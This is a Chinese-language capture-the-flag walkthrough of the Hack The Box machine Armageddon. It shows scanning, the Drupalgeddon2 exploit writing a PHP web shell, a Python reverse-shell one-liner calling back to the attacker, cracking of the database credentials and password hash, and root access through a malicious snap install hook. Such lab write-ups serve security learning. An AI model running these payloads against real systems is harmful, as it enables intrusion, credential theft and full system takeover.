# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测
```
┌──(root💀kali)-[~/htb/Armageddon]
└─# nmap -p- 10.10.10.233 --open -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-25 02:37 EST
Nmap scan report for 10.10.10.233
Host is up (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 78.51 seconds
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/htb/Armageddon]
└─# nmap -sV -Pn 10.10.10.233 -p 22,80                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-25 02:39 EST
Nmap scan report for 10.10.10.233
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.83 seconds

```

## web

只开放了两个端口，先查看http服务有什么文件信息
```
┌──(root💀kali)-[~]
└─# python3 /root/dirsearch/dirsearch.py -e* -u 10.10.10.233 -t 100          

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100
Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.233_22-01-25_02-40-43.txt

Error Log: /root/dirsearch/logs/errors-22-01-25_02-40-43.log

Target: http://10.10.10.233/

[02:40:43] Starting: 
[02:40:50] 400 -  226B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[02:40:54] 200 -  317B  - /.editorconfig                                   
[02:40:56] 200 -  174B  - /.gitignore                                                                      
[02:41:03] 200 -    1KB - /COPYRIGHT.txt                                    
[02:41:04] 200 -  109KB - /CHANGELOG.txt                                    
[02:41:04] 200 -    2KB - /INSTALL.pgsql.txt                                
[02:41:04] 200 -    2KB - /INSTALL.mysql.txt                                
[02:41:04] 200 -    9KB - /MAINTAINERS.txt                                  
[02:41:04] 200 -   18KB - /INSTALL.txt                                      
[02:41:04] 200 -   18KB - /LICENSE.txt
[02:41:05] 200 -    5KB - /README.txt                                       
[02:41:06] 200 -   10KB - /UPGRADE.txt                                      
[02:41:33] 403 -    3KB - /authorize.php                                    
[02:41:37] 400 -  226B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[02:41:38] 403 -  210B  - /cgi-bin/                                         
[02:41:43] 403 -    7KB - /cron.php                                         
[02:41:58] 200 -   10KB - /includes/                                        
[02:41:58] 301 -  237B  - /includes  ->  http://10.10.10.233/includes/      
[02:41:58] 200 -    7KB - /index.php                                        
[02:41:59] 200 -    3KB - /install.php                                      
[02:42:04] 200 -  132KB - /includes/bootstrap.inc                           
[02:42:11] 301 -  233B  - /misc  ->  http://10.10.10.233/misc/              
[02:42:12] 200 -    9KB - /modules/                                         
[02:42:13] 301 -  236B  - /modules  ->  http://10.10.10.233/modules/        
[02:42:25] 301 -  237B  - /profiles  ->  http://10.10.10.233/profiles/      
[02:42:25] 200 -  743B  - /profiles/standard/standard.info                  
[02:42:25] 200 -  278B  - /profiles/testing/testing.info                    
[02:42:25] 200 -  271B  - /profiles/minimal/minimal.info                    
[02:42:27] 200 -    2KB - /robots.txt                                       
[02:42:29] 200 -    3KB - /scripts/                                         
[02:42:29] 301 -  236B  - /scripts  ->  http://10.10.10.233/scripts/        
[02:42:33] 301 -  234B  - /sites  ->  http://10.10.10.233/sites/            
[02:42:33] 200 -  151B  - /sites/all/libraries/README.txt                   
[02:42:33] 200 -    0B  - /sites/example.sites.php                          
[02:42:33] 200 -    1KB - /sites/all/modules/README.txt
[02:42:33] 200 -  904B  - /sites/README.txt                                 
[02:42:33] 200 - 1020B  - /sites/all/themes/README.txt
[02:42:40] 200 -    2KB - /themes/                                          
[02:42:41] 301 -  235B  - /themes  ->  http://10.10.10.233/themes/          
[02:42:43] 403 -    4KB - /update.php                                       
[02:42:49] 200 -    2KB - /web.config                                       
[02:42:51] 200 -   42B  - /xmlrpc.php    
```

在CHANGELOG.txt知道这个web app是DRUPAL，版本号是7.56

kali搜索漏洞信息
```
┌──(root💀kali)-[~/htb/Armageddon]
└─# searchsploit DRUPAL 7.56
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)          | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)       | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Executi | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metas | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)  | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Ex | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                    | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                | php/webapps/46459.py
------------------------
```

存在很多个RCE，选择44449.rb，拿到foodhold
```
┌──(root💀kali)-[~/htb/Armageddon]
└─# ./44449.rb http://10.10.10.233/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo PROPZFZU
[+] Result : PROPZFZU
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[!] Response: HTTP 200 // Size: 6.   ***Something could already be there?***
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
armageddon.htb>> whoami
apache

```


# 提权到user

exp的shell不是很好用，下面payload反弹一个完整shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

收到反弹shell
```
┌──(root💀kali)-[~/htb/Armageddon]
└─# nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.233] 34420
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache

```

传linpeas到靶机，枚举到数据库密码


```
╔══════════╣ Analyzing Drupal Files (limit 70)
-r--r--r--. 1 apache apache 26565 Dec  3  2020 /var/www/html/sites/default/settings.php                                                              
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',

```

使用密码登陆数据库，查看用户信息

```
sh-4.2$ mysql -u drupaluser -p
mysql -u drupaluser -p
Enter password: CQHEy@9M*m23gBVj
use drupal;
select * from users;
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language  picture  init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html      1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
```


把哈希复制到本地，使用john爆破
```
┌──(root💀kali)-[~/htb/Armageddon]
└─# john hash.txt -wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)     
1g 0:00:00:01 DONE (2022-01-25 05:21) 0.7142g/s 165.7p/s 165.7c/s 165.7C/s tiffany..harley
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
得到用户凭据：```brucetherealadmin:booboo```

使用ssh登陆，成功拿到用户shell

```
┌──(root💀kali)-[~/htb/Armageddon]
└─# ssh brucetherealadmin@10.10.10.233
brucetherealadmin@10.10.10.233's password: 
Last failed login: Tue Jan 25 10:13:02 GMT 2022 from 10.10.14.3 on ssh:notty
There were 2 failed login attempts since the last successful login.
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ whoami
brucetherealadmin

```

# 提权到root

查看sudo特权
```
[brucetherealadmin@armageddon tmp]$ sudo -l
匹配 %2$s 上 %1$s 的默认条目：
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

用户 brucetherealadmin 可以在 armageddon 上运行以下命令：
    (root) NOPASSWD: /usr/bin/snap install *

```

可以使用snap命令

根据[gtfobins](https://gtfobins.github.io/gtfobins/snap/)的指示，我们先安装fpm

```
┌──(root💀kali)-[~/htb/Armageddon]
└─# gem install fpm                                                                                              1 ⨯
Fetching fpm-1.14.1.gem
Fetching clamp-1.0.1.gem
Fetching git-1.10.2.gem
Successfully installed clamp-1.0.1
Successfully installed git-1.10.2
Successfully installed fpm-1.14.1
Parsing documentation for clamp-1.0.1
Installing ri documentation for clamp-1.0.1
Parsing documentation for git-1.10.2
Installing ri documentation for git-1.10.2
Parsing documentation for fpm-1.14.1
Installing ri documentation for fpm-1.14.1
Done installing documentation for clamp, git, fpm after 1 seconds
3 gems installed

```

依次执行命令
```
┌──(root💀kali)-[~/htb/Armageddon]
└─# COMMAND=id 

┌──(root💀kali)-[~/htb/Armageddon]
└─# cd $(mktemp -d)
                                                                                                                     
┌──(root💀kali)-[/tmp/tmp.DmOZ5ETwqV]
└─# mkdir -p meta/hooks
                                                                                                                     
┌──(root💀kali)-[/tmp/tmp.DmOZ5ETwqV]
└─# printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
                                                                                                                     
┌──(root💀kali)-[/tmp/tmp.DmOZ5ETwqV]
└─# chmod +x meta/hooks/install

┌──(root💀kali)-[/tmp/tmp.DmOZ5ETwqV]
└─# fpm -n xxxx -s dir -t snap -a all meta
Created package {:path=>"xxxx_1.0_all.snap"}

```

传到靶机以后，看到成功打印出了id命令，也就是上面指定的:```COMMAND=id```
```
[brucetherealadmin@armageddon tmp.nSgQp1eSXc]$ sudo /usr/bin/snap install xxxx_1.0_all.snap --dangerous --devmode
Run install hook of "xxxx" snap if present                                                                        |
error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0)

```


我们把命令改为读取root.txt,再次编译

```
┌──(root💀kali)-[/tmp]
└─# COMMAND="cat /root/root.txt"
                                                                                                                     
┌──(root💀kali)-[/tmp]
└─# cd $(mktemp -d)
                                                                                                                     
┌──(root💀kali)-[/tmp/tmp.jfed6EbSgj]
└─# mkdir -p meta/hooks
                                                                                                                     
┌──(root💀kali)-[/tmp/tmp.jfed6EbSgj]
└─# printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
                                                                                                                     
┌──(root💀kali)-[/tmp/tmp.jfed6EbSgj]
└─# chmod +x meta/hooks/install
                                                                                                                     
┌──(root💀kali)-[/tmp/tmp.jfed6EbSgj]
└─# fpm -n xxxx -s dir -t snap -a all meta
Created package {:path=>"xxxx_1.0_all.snap"}

```

传到靶机以后成功读取到root.txt
```
[brucetherealadmin@armageddon tmp]$ curl http://10.10.14.3/xxxx_1.0_all.snap -O /tmp/xxxx_1.0_all.snap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4096  100  4096    0     0   7499      0 --:--:-- --:--:-- --:--:--  7501
curl: (3) <url> malformed
[brucetherealadmin@armageddon tmp]$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode
error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": a7d88c233a477....)

```

